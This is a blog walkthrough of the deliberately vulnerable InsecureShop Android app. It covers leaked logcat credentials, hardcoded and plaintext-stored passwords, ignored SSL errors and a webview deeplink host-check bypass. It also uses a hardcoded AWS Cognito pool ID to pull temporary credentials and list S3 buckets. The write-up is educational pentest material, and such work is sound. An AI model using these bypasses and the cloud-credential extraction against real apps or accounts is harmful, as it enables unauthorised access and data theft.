---
title: "InsecureShop — Android App Exploitation, pt. 1"
date: 2022-04-06
category: "mobile"
tags: ["android", "ctf", "webview", "hardcoded-credentials", "ssl"]
summary: "Part 1: InsecureShop walkthrough covering insecure logging, hardcoded credentials, insecure data storage, SSL bypass, and URL validation issues."
source: "research"
draft: false
---
![](https://i.imgur.com/4Kp22BV.png)

It's been quite a while since I've last tried to reverse engineer and hunt for vulnerabilities in android applications (last was when I took emapt?), I badly need to brush up on android stuff since I've got a new project in mind. 

## The Target: InsecureShop.apk
InsecureShop is an application that showcases vulnerabilities found in mobile pentesting scenarios. A few things to take note from the README are that:

1. You don't necessarily have to have a **rooted** android device in order to perform the exploits -> because, what's the point of trying to exploit an application when you already have superuser access to the device itself? 

> Having a rooted phone does help immensely when performing dynamic analysis/reverse engineering tho, especially when you need to use Frida to hook into a certain function or if you want to bypass SSL pinning in order to intercept network requests. 
    
2. The application only demonstrates **android-specific** vulnerabilities and does not include attacks against a vulnerable API server or other back-end systems. 
3. We have a more "modern" target app, since it was created with Kotlin instead of Java. This doesn't really matter much, but there can be some differences when decompiling Kotlin apps vs Java ones. Here are some resources that explain it better:
> - https://brompwnie.github.io/reversing/2018/02/12/Kotlin-and-Java-How-Hackers-See-Your-Code.html
> - https://stackoverflow.com/questions/66980112/difference-between-java-bytecode-and-kotlin-bytecode

## Analysis approach

Since this writeup is targetted towards beginners, we will be analyzing the application using a white-box approach:
- we can leverage the source code which is included in the github repository and compare it side-by-side with the generated decompilation of the target app.
- to make things easier, we are already given a list of the possible vulnerabilities that can be found, thus narrowing down the parts in which we should focus analyzing.  
 
## Reverse Engineering Toolset
This section covers some of the tools that I have used in order to reverse engineer and exploit the target application. I'll also include some required skills that you need (at least) a basic grasp on. The listed tools work on both Windows and Linux systems. 

### Emulators

- [Android Studio](https://developer.android.com/studio/install): simply follow the instructions for installation. By default, `sdk` and `build` tools should be installed too. Add the paths for the sdk and build tools to your environment variables. 
- [Genymotion Emulator](https://www.genymotion.com/download/): prepares a rooted android phone, not really needed if you can get Android Studio's AVD (android virtual device) to run.
- Physical phone: not an emulator but i'll just place it here. You must have developer settings enabled on this phone + connect usb cord to your machine.
### Static Analysis
- [jadx-gui](https://github.com/skylot/jadx/releases): used to decompile an apk and view the java source code (also automatically gets the java source of apps made in kotlin). Download `jadx-current.version.zip` then extract into your machine
- [apktool](https://ibotpeaches.github.io/Apktool/install/): decompiles the apk to retrieve the raw resources and smali bytecode of the application. Follow the installation steps
- [MobSF](https://mobsf.github.io/docs/#/): automates the static RE process. Not really required for this writeup, but definitely a plus to have in other engagements.

### Dynamic Analysis
- [android debug bridge (ADB)](https://developer.android.com/studio/command-line/adb): for interaction with the device (e.g: installing an application, sending queries).
- Example `adb` commands:
```shell
# install an application
C:\Users\Pc> adb install app.apk

# get a shell on the device
C:\Users\Pc> adb shell
2026:/ $ id
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0

# to retrieve a file from the device
C:\Users\Pc> adb pull /path/to/file

# if an app is debuggable (has android:debuggable set to true), we can run as the app itself and view some internal files. 
C:\Users\Pc> adb shell
2026:/ $ run-as com.mobisec.filebrowser
2026:/data/user/0/com.mobisec.filebrowser $ ls
cache  code_cache  databases  shared_prefs
```

### Required skillset + knowledge + reading resources:
- Android app development: needed for crafting the exploit application. 
- Android Security Architecture + APK Structure: https://medium.com/mobis3c/introduction-to-android-security-64609edeb18c
- Android app components: https://developer.android.com/guide/components/fundamentals
- Vulnerabilities in android components: https://www.hebunilhanli.com/wonderland/mobile-security/android-component-security/
- What to look for when reversing android apps: https://www.nowsecure.com/blog/2020/02/26/what-to-look-for-when-reverse-engineering-android-apps/
- Mobile Security Testing Guide: https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05c-reverse-engineering-and-tampering

## Mobile App Penetration Testing Process
![](https://i.imgur.com/okvGYXL.png)


I won't bore you much with details here, since the MAPT follows pretty much the same procedures as any other pentest approach. 

1. **Reconnaissance**
    - find general information about the application/company/developers through various sources.
    - scan through customer app reviews in the play store, check maybe if customers have been complaining about a particular "bug" then you can check that out
    - you can also see version releases/patch notes on the play store -> gives you an idea on when the last patch was applied, how often do the developers apply these patches. 
    - developer emails can also be seen through the playstore, maybe you can use this for later attacks
    - enumerate other applications that have been developed by the same company/developers.
3. **Static Analysis**
    - Read application source code through manual/automated means.
    - check for hardcoded strings/secrets -> maybe in the form of API keys
    - check for misconfigurations in the manifest
    - retrieve URLs that the app tries to contact, e.g: firebase database urls which could be an addition to the attack scope.
    - most companies use different api endpoints for their mobile apps (seperate from endpoints used by their web apps), so don't forget to perform additional enumeration on newly found endpoints.
5. **Dynamic Analysis**
    - Running the application and manipulating it
    - intercepting network traffic/requests using Burp/other proxies
    - check local storage (`/data/data/<com.app.name>/`) for files that are created during run-time.
    - try to dump (possibly sensitive) memory
    - break SSL pinning using Frida/Objection
7. **Reporting**
    - Executive summary of the pentest and the vulnerabilities that you have discovered.
    - write the report with the OWASP Top 10 in mind
    - provide an accurate criticality/severity rating of the vulnerabilities + recommendations on how to mitigate

## Baby Steps
The previous sections should be enough to prepare you for the following ones. To begin analyzing the target apk, load it into `jadx-gui` (you should be seeing an interface such as the one below):
![](https://i.imgur.com/WaMr92H.png)

We should also install the application into our testing device. If you're using an emulator, you can simply drag and drop the application into it. If you're using a physical device, connect it into your machine through a usb cable then execute the following commands (this also works for emulators btw):

```shell
# make sure that adb detects your device
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb devices
* daemon not running; starting now at tcp:5037
* daemon started successfully
List of devices attached
AUKRY9OVKBJVVWNF        device

# install the apk
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb install InsecureShop.apk
Performing Streamed Install
Success
```

Let's get a view of the app:
![](https://i.imgur.com/4lt9nlA.png)

It asks for credentials which we weren't provided with, from this point we will now analyze the app to figure out how we can have access.

## AndroidManifest.xml
The first point of analysis when reverse engineering android apps is to explore the contents of the android manifest. The Android Manifest is an XML file which contains important metadata about the Android app. This includes the package name, activity names, main activity (the entry point to the app), Android version support, hardware features support, permissions, and other configurations.

Here's the manifest for InsecureShop.apk:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="29" android:compileSdkVersionCodename="10" package="com.insecureshop" platformBuildVersionCode="29" platformBuildVersionName="10">
    <uses-sdk android:minSdkVersion="16" android:targetSdkVersion="29"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <permission android:name="com.insecureshop.permission.READ"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <application android:theme="@style/AppTheme" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:name="com.insecureshop.InsecureShopApp" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity android:name="com.insecureshop.ChooserActivity" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="application/*"/>
                <data android:mimeType="audio/*"/>
                <data android:mimeType="image/*"/>
                <data android:mimeType="text/*"/>
                <data android:mimeType="video/*"/>
            </intent-filter>
            <meta-data android:name="android.service.chooser.chooser_target_service" android:value=".ConversationChooserTargetService"/>
        </activity>
        <activity android:name="com.insecureshop.AboutUsActivity" android:exported="true"/>
        <activity android:name="com.insecureshop.CartListActivity"/>
        <activity android:name="com.insecureshop.ProductListActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="com.insecureshop.LoginActivity"/>
        <activity android:name="com.insecureshop.WebViewActivity">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="insecureshop" android:host="com.insecureshop"/>
            </intent-filter>
        </activity>
        <activity android:name="com.insecureshop.WebView2Activity">
            <intent-filter>
                <action android:name="com.insecureshop.action.WEBVIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
            </intent-filter>
        </activity>
        <activity android:name="com.insecureshop.PrivateActivity" android:exported="false"/>
        <activity android:name="com.insecureshop.SendingDataViaActionActivity"/>
        <activity android:name="com.insecureshop.ResultActivity" android:exported="true"/>
        <provider android:name="com.insecureshop.contentProvider.InsecureShopProvider" android:readPermission="com.insecureshop.permission.READ" android:exported="true" android:authorities="com.insecureshop.provider"/>
        <provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.insecureshop.file_provider" android:grantUriPermissions="true">
            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
        </provider>
        <service android:name="net.gotev.uploadservice.UploadService" android:enabled="true" android:exported="true"/>
    </application>
</manifest>
```

From what we can see, the app uses the following permissions:
- `android.permission.INTERNET`
- `android.permission.READ_EXTERNAL_STORAGE`
- `android.permission.WRITE_EXTERNAL_STORAGE`
- `android.permission.READ_CONTACTS`
- `android.permission.WAKE_LOCK`
- `com.insecureshop.permission.READ` -> custom permission

The app has the following activities:
- `com.insecureshop.ChooserActivity`, with intent-filter
- `com.insecureshop.AboutUsActivity`, exported
- `com.insecureshop.CartListActivity`
- `com.insecureshop.ProductListActivity`, LAUNCHER activity
- `com.insecureshop.LoginActivity`
- `com.insecureshop.WebViewActivity`, BROWSABLE
- `com.insecureshop.WebView2Activity`, BROWSABLE
- `com.insecureshop.PrivateActivity`
- `com.insecureshop.SendingDataViaActionActivity`

Content providers:
- com.insecureshop.contentProvider.InsecureShopProvider, exported yikes.
- androidx.core.content.FileProvider

Service:
- net.gotev.uploadservice.UploadService

We'll go more in-depth into each app component later, but for now we'll focus on the following activity: `com.insecureshop.ProductListActivity` which is the launcher activity of the application, or it's entry point.

![](https://i.imgur.com/QbAcmkP.png)

Focus on the highlighted block of code on the onCreate method, it first checks if we already have populated the username value in the app's SharedPreferences file. If not, then it starts the LoginActivity which is what we see when we first start the app. 

## Vulnerability #1: Insecure Logging
Reviewing the source code of `com.insecureshop.LoginActivity` shows that the username and password values that we provide are being leaked into logcat. 

![](https://i.imgur.com/uF3yIu7.png)

This is only a low-severity vulnerability since only physical attackers could access the device logs. For the POC, we need to input some dummy values then grep logcat for the `userName` or `password` keys:

![](https://i.imgur.com/ZbeI0cn.png)

After the credentials have been logged, we enter the following if block on line 44 which first calls `Util.INSTANCE.verifyUsernamepassword()` with the credentials that we provide and uses the Boolean return value for the check. 

## Vulnerability #2: Hardcoded Credentials
Navigating to the `util.Util` class, we can see that `verifyUserNamePassword` calls `getUserCreds` and compares the values that it returns with the values that we provide. 
![](https://i.imgur.com/2GRr6DE.png)

The vulnerability here is that credentials are hardcoded into the `getUserCreds` method, thus giving us a valid account that we can use to login into the app. 

> username: shopuser
> password: !ns3csh0p

## Vulnerability #3: Insecure Data Storage
If we go back to `com.insecureshop.LoginActivity` and analyze the code that follows after we successfully login (check lines 44-70), we see that the following code saves the username and password values into the app's shared preferences.

```kotlin
Prefs prefs = Prefs.INSTANCE;
Context applicationContext = getApplicationContext();
Intrinsics.checkExpressionValueIsNotNull(applicationContext, "applicationContext");
prefs.getInstance(applicationContext).setUsername(username);
Prefs prefs2 = Prefs.INSTANCE;
Context applicationContext2 = getApplicationContext();
Intrinsics.checkExpressionValueIsNotNull(applicationContext2, "applicationContext");
prefs2.getInstance(applicationContext2).setPassword(password);
Util.saveProductList$default(Util.INSTANCE, this, null, 2, null);
startActivity(new Intent(this, ProductListActivity.class));
return;

```

proof-of-concept: since the app is debuggable, we can `run-as` the application in order to view the contents of its internal storage:

```shell
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell
2026:/ $ run-as com.insecureshop
2026:/data/user/0/com.insecureshop $ ls -la
total 72
drwx------   7 u0_a478 u0_a478        4096 2022-04-06 10:38 .
drwxrwx--x 357 system  system        20480 2022-04-06 10:23 ..
drwxrwx--x   2 u0_a478 u0_a478        4096 2022-04-06 10:38 app_textures
drwx------   3 u0_a478 u0_a478        4096 2022-04-06 10:38 app_webview
drwxrws--x   4 u0_a478 u0_a478_cache  4096 2022-04-06 10:38 cache
drwxrws--x   2 u0_a478 u0_a478_cache  4096 2022-04-06 10:22 code_cache
drwxrwx--x   2 u0_a478 u0_a478        4096 2022-04-06 10:38 shared_prefs
2026:/data/user/0/com.insecureshop $ cd shared_prefs/
2026:/data/user/0/com.insecureshop/shared_prefs $ ls
Prefs.xml  WebViewChromiumPrefs.xml
2026:/data/user/0/com.insecureshop/shared_prefs $ cat Prefs.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="password">!ns3csh0p</string>
    <string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
    <string name="username">shopuser</string>
</map>
2026:/data/user/0/com.insecureshop/shared_prefs $
```

> If you're using a rooted android device, you can just directly navigate to the app's internal storage directory without executing the `run-as` command. The vulnerability could be avoided by simply trying to encrypt the data before saving. 

## Vulnerability #4: Lack of SSL Certificate Validation
An often overlooked part when testing mobile apps is checking whether the app properly verifies the validity of a given SSL certificate.

![](https://i.imgur.com/8kj89k7.png)

When a certificate is invalid or malicious, it might allow an attacker to spoof a trusted entity by interfering in the communication path between the host and client. The software might connect to a malicious host while believing it is a trusted host, or the software might be deceived into accepting spoofed data that appears to originate from a trusted host. Such is the case of `com.insecureshop.WebViewActivity`

![](https://i.imgur.com/95wzcG0.png)

Checking the code above, we can see that WebViewActivity uses a `CustomWebViewClient()` object. Examining this class reveals the following block of code:

![](https://i.imgur.com/p5NwG6h.png)

CustomWebViewClient overrides the `onReceivedSslError` method of its `WebViewClient` parent, but does not properly handle instances where the client actually receives invalid ssl certificates instead it ignores the error and continues to do `handler.proceed()`. 

For the proof-of-concept, we can simply try to intercept HTTPS requests even without having a valid SSL/proxy certificate installed on the device. If confirmed, then the app does not properly validate SSL certs.

One thing that might concern readers is that `com.insecureshop.WebViewActivity` isn't really explicitly used anywhere in the application, even after reading every line of the source code. True, but when we check the manifest entry for the application we see that it defines a [deeplink](https://developer.android.com/training/app-links/deep-linking):

```xml
<activity android:name="com.insecureshop.WebViewActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="insecureshop" android:host="com.insecureshop"/>
    </intent-filter>
</activity>
```

As an attacker, we can try to phish credentials from a target victim by using a malicious app to open up a deeplink with the following URI: `insecureshop://com.insecureshop/web?url=facebook.com` which then opens up `facebook.com` on the vulnerable webview.

POC Steps:
1. Make sure that you don't have a valid, working certificate installed on your device. 
2. Use the following guide to configure burp + your device's wifi proxy settings **BUT DO NOT INSTALL THE BURP CERTIFICATE**: https://portswigger.net/support/configuring-an-android-device-to-work-with-burp
3. Fire up the following adb command which should open `google.com` on the vulnerable webview:
```shell
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d insecureshop://com.insecureshop/web?url=https://google.com
Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=insecureshop://com.insecureshop/web?url=https://google.com }
```
5. Try to search some stuff up and intercept the request. If you are able to intercept the https request for your search query, then you have verified that the app does not properly validate SSL certs.

![](https://i.imgur.com/mWRz2kJ.png)

## Vulnerability #5: Insufficient URL Validation
Building up on vulnerabilities related to `com.insecureshop.WebViewActivity`, we continue to review the logic on how it handles the urls sent via deeplink. Open up the activity on jadx-gui and focus on lines 31-45.

![](https://i.imgur.com/mzYEWDB.png)

It gets the data from the intent and stores it into the uri variable, continues to check if the path of the uri is one of the following values: `/web` or `/webview`.

If we use the `/web` path, it takes the query parameter `?url` from the uri and stores it into the data variable which is being used in `webview.loadUrl` on line 45. This code block does not properly validate the URLs that are passed, this is a vulnerability since malicious apps can open up any arbitrary website/content. POC adb command is the same with `Vulnerability #4`.

## Vulnerability #6: Weak Host Validation

Now let's focus on the else if block when the path supplied in a deeplink is `/webview`. Similar to the previous vulnerability, it retrieves data from the intent -> gets the `?url` query parameter. 

![](https://i.imgur.com/ans16hC.png)

However, there is an additional step to check if the url we retrieved endswith the string `insecureshopapp.com`. This may be a mechanism implemented by developers to only allow opening urls that they own. However, this is vulnerable since we can easily bypass the check:

```shell
C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d insecureshop://com.insecureshop/webview?url=https://google.com/?ignore=insecureshopapp.com
Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=insecureshop://com.insecureshop/webview?url=https://google.com/?ignore=insecureshopapp.com }
```

## Vulnerability #7: AWS Cognito Misconfiguration

It's not very incommon that android apps nowadays use cloud services - and not very uncommon either that developers sometimes hardcode potentially sensitive API keys into the resources of the app. While browsing through `strings.xml`, we found the following key:
```xml
<string name="aws_Identity_pool_ID">us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c</string>
```

After a bit of researching, I found out the following documentation for [AWS Cognito Identity Pools](https://docs.aws.amazon.com/cognito/latest/developerguide/identity-pools.html) which are supposedly a means to provide temporary AWS credentials for unauthenticated users/guests.

> If you ever find a suspicious API key in some bug bounty program or pentest, try to refer https://github.com/streaak/keyhacks in checking if the "leaked" key has some potential security issues.

Using the mentioned keyhacks repo, I tried to read the part regarding AWS and tried to install awscli using the following command:

```shell
sudo apt-get install awscli
```

To test this vulnerability, I followed used the following writeup as a reference: https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963

First step that we need to do is to extract AWS credentials (access_key, secret_key, session_token) from the identity-pool:

```shell
aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c --region us-east-1 
aws cognito-identity get-credentials-for-identity --identity-id <identity-id-from-previous-command> --region us-east-1
```

![](https://i.imgur.com/kiciz8p.png)

Afterwhich, we'll use the following script (https://github.com/andresriancho/enumerate-iam) to enumerate permissions with the credentials that we have.

```shell
python3 enumerate-iam.py --access-key <ACCESS-KEY-ID> --secret-key <SECRET-KEY-ID> --session-token <SESSION-TOKEN-VALUE>
```

![](https://i.imgur.com/NwQExl7.png)

An interesting permission that we have is that we can list the s3 buckets. For it to work, we need to configure our credentials (I'm using new creds here, I may have messed something up earlier):

![](https://i.imgur.com/VWlDPa3.png)

We see two buckets, now let's see what they contain:

```shell
┌──(ctfvm㉿ctfvm)-[~/Desktop/test/enumerate-iam]
└─$ aws s3 ls                                                                                                                        
2020-11-15 12:31:10 elasticbeanstalk-us-west-2-094222047775
2022-03-22 13:05:02 telegram00lasagnahowto
                                                                                                                                                                                 
┌──(ctfvm㉿ctfvm)-[~/Desktop/test/enumerate-iam]
└─$ aws s3 ls s3://telegram00lasagnahowto --recursive
2022-03-22 13:07:00       1949 Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io <- writeup here
                                                                                                                                                                                 
┌──(ctfvm㉿ctfvm)-[~/Desktop/test/enumerate-iam]
└─$ aws s3 ls s3://elasticbeanstalk-us-west-2-094222047775 --recursive
2022-03-22 13:06:59       1949 Misconfiguration of Misconfiguration task lol - https://t.me/lasagnahowto , https://uvicorn.github.io <- writeup here

```

Looks like some other player has left nothing for us lmao. To summarize the poc:

1. Extract AWS credentials (access_key, secret_key and session_token ) from the identity pool;
2. Enumerate permissions/roles for the credentials that you have;
3. Privesc by abusing permissions.

## -- END --
That's it for now. In the next parts, we'll be attempting to attack some of the other android components and develop malicious apks in order to exploit their vulnerabilities.